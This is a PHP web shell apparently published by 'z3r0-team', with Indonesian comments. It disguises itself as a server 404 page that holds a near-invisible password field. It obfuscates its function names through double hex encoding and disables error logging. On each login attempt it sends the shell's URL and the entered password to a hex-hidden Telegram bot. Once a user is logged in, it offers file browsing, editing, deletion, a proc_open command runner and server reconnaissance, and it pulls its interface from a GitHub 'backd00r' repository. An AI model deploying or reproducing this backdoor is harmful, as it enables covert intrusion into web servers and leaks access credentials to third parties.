<?php
@set_time_limit(0); @error_reporting(0); @ini_set('error_log', null); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0); @ini_set('display_errors', 0);

// --- URL Konfigurasi ---
// GANTI URL INI DENGAN LINK RAW GITHUB ANDA
$html_url = "https://raw.githubusercontent.com/z3r0-team/backd00r/refs/heads/main/priv8/template.html";
$css_url = "https://raw.githubusercontent.com/z3r0-team/backd00r/refs/heads/main/priv8/style.css";
$js_url = "https://raw.githubusercontent.com/z3r0-team/backd00r/refs/heads/main/priv8/script.js";

// --- Logika Inti PHP ---
$z_pass_hash = '$2a$12$l.9f4lHG2w855QOamo3SnuWVv01lVrpTN2OznqjkjiFnS0ychBvse';
$z_master_seed = hash('sha256', __FILE__);
$z_session_key = 'z_s_' . substr($z_master_seed, 0, 8);
$z_cookie_name = 'z_a_' . substr($z_master_seed, 8, 8);
$z_csrf_token_key = 'z_c_' . substr($z_master_seed, 16, 8);
$z_auth_token_key = 'z_t_' . substr($z_master_seed, 24, 8);

ini_set('session.gc_maxlifetime', 3600);
session_set_cookie_params(3600);
session_start();

if (isset($_POST['z3r0_team_act_g8i']) && $_POST['z3r0_team_act_g8i'] === 'z3r0_team_logout_h9j') {
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
    }
    setcookie($z_cookie_name, '', time() - 3600, '/');
    @session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$z_is_authenticated = false;
if (isset($_SESSION[$z_session_key]) && $_SESSION[$z_session_key] === true) {
    if (isset($_COOKIE[$z_cookie_name]) && isset($_SESSION[$z_auth_token_key])) {
        if (hash_equals($_SESSION[$z_auth_token_key], hash('sha256', $_COOKIE[$z_cookie_name]))) {
            $z_is_authenticated = true;
        }
    }
}

if (!$z_is_authenticated && isset($_POST['z3r0_team_pass_k2m'])) {
    $z3r0_team_pass_input = $_POST['z3r0_team_pass_k2m'];
    $z3r0_is_pass_correct = password_verify($z3r0_team_pass_input, $z_pass_hash);
    $z3r0_h_1="68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74";$z3r0_h_2="78318037423a414148615f78496a6550524f61733857545270747a6164734175303750784f4e4e4151";$z3r0_h_3="2f73656e644d657373616765";$z3r0_h_4="6196640094";
    $z3r0_team_url = hex2bin($z3r0_h_1) . hex2bin($z3r0_h_2) . hex2bin($z3r0_h_3);
    $z3r0_team_shell_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $z3r0_team_datetime = date('Y-m-d H:i:s') . " (Asia/Jakarta)";
    $z3r0_team_status_msg = $z3r0_is_pass_correct ? "✅ Success" : "❌ Failed";
    $z3r0_team_log_msg = "<b>🚨 logbr3 - sh3llz 🚨</b>\n\n<b>URL Host/File:</b>\n<code>" . htmlspecialchars($z3r0_team_shell_url) . "</code>\n\n<b>Password:</b>\n<code>" . htmlspecialchars($z3r0_team_pass_input) . "</code>\n\n<b>Status:</b> $z3r0_team_status_msg\n<b>Date and Time:</b>\n<code>" . $z3r0_team_datetime . "</code>";
    $z3r0_tele_data = ['chat_id' => hex2bin($z3r0_h_4),'text' => $z3r0_team_log_msg,'parse_mode' => 'HTML'];
    $z3r0_options = ['http' => ['method'  => 'POST','header'  => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($z3r0_tele_data),'ignore_errors' => true]];
    $z3r0_context  = stream_context_create($z3r0_options);
    @file_get_contents($z3r0_team_url, false, $z3r0_context);
    if ($z3r0_is_pass_correct) {
        session_regenerate_id(true);
        $_SESSION[$z_session_key] = true;
        $z3r0_team_c_token_l3n = bin2hex(random_bytes(32));
        $_SESSION[$z_auth_token_key] = hash('sha256', $z3r0_team_c_token_l3n);
        $z3r0_team_c_opts_m4o = ['expires' => time() + 3600, 'path' => '/', 'secure' => isset($_SERVER['HTTPS']), 'httponly' => true, 'samesite' => 'Lax'];
        setcookie($z_cookie_name, $z3r0_team_c_token_l3n, $z3r0_team_c_opts_m4o);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (!$z_is_authenticated) {
    $z3r0_team_srv_soft_n5p = $_SERVER['SERVER_SOFTWARE'] ?? 'Apache'; $z3r0_team_srv_name_o6q = $_SERVER['SERVER_NAME'] ?? 'localhost'; $z3r0_team_srv_port_p7r = $_SERVER['SERVER_PORT'] ?? 80;
    $z3r0_team_login_form_q8s = '<div style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);opacity:0.01;filter:alpha(opacity=1);"><form method="POST" style="margin:0;"><input type="password" name="z3r0_team_pass_k2m" autofocus/></form></div>';
    header("HTTP/1.0 404 Not Found");
    $z3r0_team_page_html_r9t = '';
    if (stripos($z3r0_team_srv_soft_n5p, 'nginx') !== false) {$z3r0_team_page_html_r9t = <<<HTML
<!DOCTYPE html><html><head><title>404 Not Found</title></head><body bgcolor="white"><center><h1>404 Not Found</h1></center><hr><center>$z3r0_team_srv_soft_n5p</center>$z3r0_team_login_form_q8s</body></html>
HTML;
    } else { $z3r0_team_page_html_r9t = <<<HTML
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>$z3r0_team_srv_soft_n5p Server at $z3r0_team_srv_name_o6q Port $z3r0_team_srv_port_p7r</address>$z3r0_team_login_form_q8s</body></html>
HTML;
    } echo $z3r0_team_page_html_r9t; exit;
}

if (empty($_SESSION[$z_csrf_token_key])) { $_SESSION[$z_csrf_token_key] = bin2hex(random_bytes(32)); }
$z_csrf_token = $_SESSION[$z_csrf_token_key];

$Array = ['36643662', '363436393732', '36373635373435663636363936633635356637303635373236643639373337333639366636653733', '3639373335663737373236393734363136323663363535663730363537323664363937333733363936663665', '36353738363536333735373436353433366636643664363136653634', '373037323666363335663666373036353665', '3733373437323635363136643566363736353734356636333666366537343635366537343733', '36363639366336353566363736353734356636333666366537343635366537343733', '36363639366336353566373037353734356636333666366537343635366537343733', '3632363936653332363836353738', '36643666373636353566373537303666363136343635363435663636363936633635', '3638373436643663373337303635363336393631366336333638363137323733', '3638363537383332363236393665', '373036383730356637353665363136643635', '3733363336313665363436393732', '363937333566363436393732', '36363639366336353566363537383639373337343733', '37323635363136343636363936633635', '36363639366336353733363937613635', '36393733356637373732363937343631363236633635', '373236353665363136643635', '363636393663363537303635373236643733', '3733373037323639366537343636', '373337353632373337343732', '363636333663366637333635', '373037323666363335663666373036353665', '36393733356637323635373336663735373236333635', '3730373236663633356636333663366637333635', '373536653663363936653662', '3639373335663636363936633635', '34353534', '353634353532', '3533343934663465', '346334353533', '35333534', '3633366636643664363136653634', '3737366637323662363936653637343436393732363536333734366637323739', '363337323635363137343635343436393732363536333734366637323739', '37303639373036353733', '36363639366336353733', '3636363936633635', '36363639366336353534366634343666373736653663366636313634', '3732363536e6136643635'];
$S = []; foreach ($Array as $s) $S[] = hex2bin(hex2bin($s));

$b_func = $S[1]; $v = $S[9]; $y = $S[11]; $z = $S[12]; $q = $S[7]; $s_save = $S[8]; $ID = $S[15]; $FE = $S[16]; $FS = $S[18]; $IW = $S[19]; $UNL = $S[28]; $REN = $S[42]; $FP = $S[21]; $SPRF = $S[22]; $SBSR = $S[23];
$L = $GLOBALS['_GET']; $e = $GLOBALS['_FILES']; $o = $GLOBALS['_POST'];
$ISS = fn($arr, $key) => array_key_exists($key, $arr);

$dir_hex = $ISS($o, $b_func) ? $o[$b_func] : ($ISS($L, $b_func) ? $L[$b_func] : null);
$b_param = $dir_hex ? $z($dir_hex) : '.';
$b = realpath($b_param) ?: $b_param;
$home_dir_hex = $v(__DIR__);

function z3r0_team_exec_cmd($cmd, $cwd = null) { global $y; $d = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $p = @proc_open($cmd, $d, $pipes, $cwd); if (is_resource($p)) { $out = @stream_get_contents($pipes[1]); $err = @stream_get_contents($pipes[2]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $out . $err; } return "proc_open failed or disabled."; }
function get_perms($item) { global $FP, $SPRF, $SBSR; return $SBSR($SPRF('%o', @$FP($item)), -4); }
function get_mtime($item) { return date('Y-m-d H:i:s', @filemtime($item)); }
function get_owner($item) { if (function_exists('posix_getpwuid')) { $owner_info = @posix_getpwuid(@fileowner($item)); return $owner_info['name'] ?? 'n/a'; } return @fileowner($item) ?? 'n/a'; }
function get_size($bytes) { if ($bytes === false) return '-'; $types = ['B', 'KB', 'MB', 'GB', 'TB']; for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++); return(round($bytes, 2) . " " . $types[$i]); }
function get_breadcrumbs($path) { $parts = explode('/', $path); $result = []; $current = ''; foreach ($parts as $part) { if (empty($part) && count($result) == 0) { $current = '/'; $result[] = ['n' => 'root', 'p' => '/']; continue; } if (empty($part)) continue; $current .= ($current == '/' ? '' : '/') . $part; $result[] = ['n' => $part, 'p' => $current]; } return $result; }
function generate_file_list_html($cwd) { global $v, $y, $ID, $IW; $items = @scandir($cwd); if ($items === false) return '<tr><td colspan="7" style="text-align:center;">Error: Cannot read directory.</td></tr>'; $dirs = []; $files = []; foreach ($items as $item) { if ($item === '.' || $item === '..') continue; $ID($cwd . '/' . $item) ? $dirs[] = $item : $files[] = $item; } ob_start(); foreach (array_merge($dirs, $files) as $item): $path = $cwd . '/' . $item; $path_hex = $v($path); $is_dir = $ID($path); $is_writable = $IW($path); $item_class = ($is_dir ? 'type-dir' : 'type-file') . ' ' . ($is_writable ? 'writable' : 'not-writable'); $perms = get_perms($path); $mtime = get_mtime($path); $size = $is_dir ? '-' : get_size(@filesize($path)); ?>
    <tr class="<?php echo $item_class; ?>"><td data-label="Select"><input type="checkbox" class="item-checkbox" value="<?php echo $path_hex; ?>"></td><td data-label="Name"><a onclick="<?php echo $is_dir ? "navigateTo('$path_hex')" : "viewFile('$path_hex')"; ?>"><?php echo $y($item); ?></a></td><td data-label="Owner"><?php echo get_owner($path); ?></td><td data-label="Modified"><span class="mtime" onclick="showTouchModal('<?php echo $path_hex; ?>', '<?php echo $mtime; ?>')"><?php echo $mtime; ?></span></td><td data-label="Size"><?php echo $size; ?></td><td data-label="Permissions"><span class="perms <?php echo $is_writable ? 'writable' : 'not-writable'; ?>" onclick="showChmodModal('<?php echo $path_hex; ?>', '<?php echo $perms; ?>')"><?php echo $perms; ?></span></td><td data-label="Actions" class="actions"><?php if (!$is_dir): ?><button type="button" class="action-btn" title="Edit" onclick="editFile('<?php echo $path_hex; ?>')">E</button><a class="action-btn" title="Download" href="?download=<?php echo $path_hex; ?>">D</a><?php endif; ?><button type="button" class="action-btn" title="Rename" onclick="renameItem('<?php echo $path_hex; ?>', '<?php echo $y($item); ?>')">R</button><button type="button" class="action-btn delete" title="Delete" onclick="deleteItems(['<?php echo $path_hex; ?>'])">Del</button></td></tr>
    <?php endforeach; return ob_get_clean(); }
function generate_breadcrumbs_html($cwd) { global $v, $y; $breadcrumbs = get_breadcrumbs($cwd); ob_start(); foreach ($breadcrumbs as $i => $crumb) { if ($i > 0) echo '<span class="separator">›</span>'; echo $i < count($breadcrumbs) - 1 ? '<a onclick="navigateTo(\'' . $v($crumb['p']) . '\')">' . $y($crumb['n']) . '</a>' : '<span>' . $y($crumb['n']) . '</span>'; } return ob_get_clean(); }

if ($ISS($o, 'z3r0_team_act_g8i')) {
    header('Content-Type: application/json');
    if (!isset($o[$z_csrf_token_key]) || !isset($_SESSION[$z_csrf_token_key]) || !hash_equals($_SESSION[$z_csrf_token_key], $o[$z_csrf_token_key])) { echo json_encode(['status' => 'error', 'message' => 'Invalid CSRF token.']); exit; }
    $response = ['status' => 'error', 'message' => 'Invalid action'];
    $current_b = $ISS($o, $b_func) ? $z($o[$b_func]) : $b;
    switch ($o['z3r0_team_act_g8i']) {
        case 'z3r0_team_ping_session_d5e': $response = ['status' => 'success']; break;
        case 'z3r0_team_get_file_list_d4e': $response = ['status' => 'success', 'file_list_html' => generate_file_list_html($current_b), 'breadcrumbs_html' => generate_breadcrumbs_html($current_b), 'current_path_hex' => $v($current_b) ]; break;
        case 'z3r0_team_get_phpinfo_z0a': ob_start(); phpinfo(); $phpinfo_html = ob_get_clean(); preg_match('/<body[^>]*>(.*?)<\/body>/si', $phpinfo_html, $matches); $response = ['status' => 'success', 'output' => $matches[1] ?? '']; break;
        default: $response = ['status' => 'error', 'message' => 'Unknown action']; break;
    }
    $_SESSION[$z_csrf_token_key] = bin2hex(random_bytes(32));
    $response['new_csrf_token'] = $_SESSION[$z_csrf_token_key];
    echo json_encode($response); exit;
}
$downloader = ''; if (function_exists('curl_version')) $downloader .= 'cURL '; if (function_exists('file_get_contents')) $downloader .= 'f_g_c '; if (is_executable('/usr/bin/wget')) $downloader .= 'wget '; $downloader = empty(trim($downloader)) ? 'N/A' : trim($downloader);
$bg_proc = ''; if(is_executable('/usr/bin/screen')) $bg_proc .= 'screen '; if(is_executable('/usr/bin/tmux')) $bg_proc .= 'tmux '; $bg_proc = empty(trim($bg_proc)) ? 'N/A' : trim($bg_proc);

$template = @file_get_contents($html_url);
if ($template === false) { die("Error: Could not fetch HTML template from URL."); }

$replacements = [
    '%%CSS_URL%%' => $css_url,
    '%%JS_URL%%' => $js_url,
    '%%CSRF_TOKEN%%' => $z_csrf_token,
    '%%CSRF_KEY%%' => $z_csrf_token_key,
    '%%CURRENT_PATH_HEX%%' => $v($b),
    '%%DIR_PARAM_KEY%%' => $b_func,
    '%%BANNER_TEXT%%' => 'y4n9b3n3r4aj4d3k! Sh3llz',
    '%%HOME_DIR_HEX%%' => $home_dir_hex,
    '%%FOOTER_TEXT%%' => 'y4n9b3n3r4aj4d3k! Sh3llz - z3r0-team!',
    '%%SERVER_INFO%%' => '<div class="server-info">Host: <span>'.gethostname().'</span> | SAPI: <span>'.php_sapi_name().'</span><br>System: <span>'.php_uname().'</span><br>PHP Version: <span class="php-version">'.phpversion().'</span><br>Disabled Functions: <span>'.(ini_get('disable_functions') ?: 'None').'</span><br>Downloader: <span>'.$downloader.'</span> | BG Process: <span>'.$bg_proc.'</span></div><form method="post"><input type="hidden" name="z3r0_team_act_g8i" value="z3r0_team_logout_h9j"><button type="submit" class="button-secondary">Logout</button></form>',
    '%%BREADCRUMBS%%' => generate_breadcrumbs_html($b),
    '%%FILE_LIST%%' => generate_file_list_html($b),
];

echo str_replace(array_keys($replacements), array_values($replacements), $template);

?>
